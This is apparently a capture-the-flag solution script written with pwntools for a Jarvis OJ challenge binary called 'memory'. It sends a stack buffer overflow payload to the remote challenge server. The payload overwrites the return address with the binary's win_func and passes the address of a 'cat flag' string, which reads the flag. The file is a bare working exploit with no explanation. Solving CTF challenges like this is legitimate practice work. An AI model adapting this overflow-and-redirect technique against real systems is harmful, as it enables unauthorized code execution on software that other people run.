from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

#cn = process('./memory')
cn = remote('pwn2.jarvisoj.com', 9876)
bin = ELF('./memory')
cn.recv()

p_cat_flag = 0x080487E0

pay = 'a'*0x13 + 'bbbb'
pay += p32(bin.symbols['win_func']) + p32(p_cat_flag) + p32(p_cat_flag)
cn.sendline(pay)
cn.recv()
print cn.recv()